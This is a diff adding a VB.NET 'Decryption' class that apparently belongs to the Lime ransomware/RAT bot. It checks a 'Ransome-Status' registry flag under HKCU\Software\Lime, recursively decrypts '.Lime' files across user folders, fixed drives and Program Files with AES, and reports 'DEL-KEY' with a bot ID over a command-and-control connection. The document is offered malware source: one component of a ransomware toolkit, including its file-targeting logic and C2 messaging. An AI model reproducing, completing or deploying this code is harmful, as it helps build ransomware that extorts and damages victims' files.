@@ -1,0 +1,139 @@
+﻿Imports System.IO
+Imports System.Security.Cryptography
+
+Public Class Decryption
+    Public P1 As String
+    Private num
+    Private userName As String = Environment.UserName
+    Private C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3)
+    Public Shared SPL As String = "|'L'|"
+
+
+
+    Public Sub BeforeDec()
+        Dim D1 As Threading.Thread = New Threading.Thread(AddressOf Dec)
+        D1.Start()
+    End Sub
+
+
+
+    Public Sub Dec(ByVal key As String)
+        Try
+            Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing)
+            If readValue <> "Encrypted" Or readValue = "Decryption In progress..." Or readValue = "Encryption in progress..." Then
+                Exit Sub
+            End If
+
+            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", "Decryption in progress...")
+
+            Dim T1 As New Threading.Thread(AddressOf Dec_Prog)
+            Dim T2 As New Threading.Thread(AddressOf Dec_Driver)
+            Dim T3 As New Threading.Thread(AddressOf Dec_User)
+
+            T1.Start()
+            T2.Start()
+            T3.Start()
+
+
+            Do Until num = 3
+                Threading.Thread.Sleep(500)
+            Loop
+
+            num = Nothing
+            P1 = Nothing
+            Threading.Thread.CurrentThread.Sleep(1000)
+            Main.Send("DEL-KEY" + SPL + ID.Bot)
+
+            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", "Decrypted")
+
+            Try
+                Main.C.Close()
+                Main.C = Nothing
+            Catch ex As Exception
+            End Try
+        Catch ex As Exception
+        End Try
+
+
+    End Sub
+
+    Public Sub Dec_User(ByVal password As String)
+        On Error Resume Next
+        Dir_Dec(C_DIR & "Users\" & userName & "\", P1)
+        num += 1
+    End Sub
+
+    Public Sub Dec_Driver(ByVal password As String)
+        On Error Resume Next
+        For Each drive In Environment.GetLogicalDrives
+            Dim Driver As DriveInfo = New DriveInfo(drive)
+            If Driver.DriveType = DriveType.Fixed AndAlso Not Driver.ToString.Contains(C_DIR) Then
+                Dim DriverPath As String = drive
+                Dir_Dec(DriverPath, P1)
+            End If
+        Next
+        num += 1
+    End Sub
+
+    Public Sub Dec_Prog(ByVal password As String)
+        On Error Resume Next
+        If ID.AmiAdmin = "Administrator" Then
+            Dir_Dec(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\", P1)
+        End If
+        num += 1
+    End Sub
+
+    Public Function AES_Dec(ByVal B2Dec As Byte(), ByVal KeyBytes As Byte()) As Byte()
+        On Error Resume Next
+        Dim DecBytes As Byte() = Nothing
+        Dim saltBytes As Byte() = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
+        Using ms As IO.MemoryStream = New MemoryStream()
+            Using AES As RijndaelManaged = New RijndaelManaged()
+                AES.KeySize = 256
+                AES.BlockSize = 128
+                Dim key = New Rfc2898DeriveBytes(KeyBytes, saltBytes, 1000)
+                AES.Key = key.GetBytes(AES.KeySize / 8)
+                AES.IV = key.GetBytes(AES.BlockSize / 8)
+                AES.Mode = CipherMode.CBC
+                Using cs = New CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write)
+                    cs.Write(B2Dec, 0, B2Dec.Length)
+                    cs.Close()
+                End Using
+
+                DecBytes = ms.ToArray()
+            End Using
+        End Using
+
+        Return DecBytes
+    End Function
+
+    Public Sub File_Dec(ByVal file As String, ByVal key As String)
+        On Error Resume Next
+        Dim B2Dec As Byte() = IO.File.ReadAllBytes(file)
+        Dim KeyBytes As Byte() = Text.Encoding.UTF8.GetBytes(key)
+        KeyBytes = SHA256.Create().ComputeHash(KeyBytes)
+        Dim BytesDec As Byte() = AES_Dec(B2Dec, KeyBytes)
+        IO.File.WriteAllBytes(file, BytesDec)
+        Dim exten As String = System.IO.Path.GetExtension(file)
+        Dim result As String = file.Substring(0, file.Length - exten.Length)
+        IO.File.Move(file, result)
+    End Sub
+
+    Public Sub Dir_Dec(ByVal ThePath As String, ByVal key As String)
+        On Error Resume Next
+        Dim files As String() = Directory.GetFiles(ThePath)
+        Dim SubDirectories As String() = Directory.GetDirectories(ThePath)
+        For i As Integer = 0 To files.Length - 1
+            Dim exten As String = Path.GetExtension(files(i))
+            If exten = ".Lime" Then
+                File_Dec(files(i), key)
+            End If
+        Next
+
+        For i As Integer = 0 To SubDirectories.Length - 1
+            Dir_Dec(SubDirectories(i), key)
+        Next
+
+    End Sub
+
+End Class
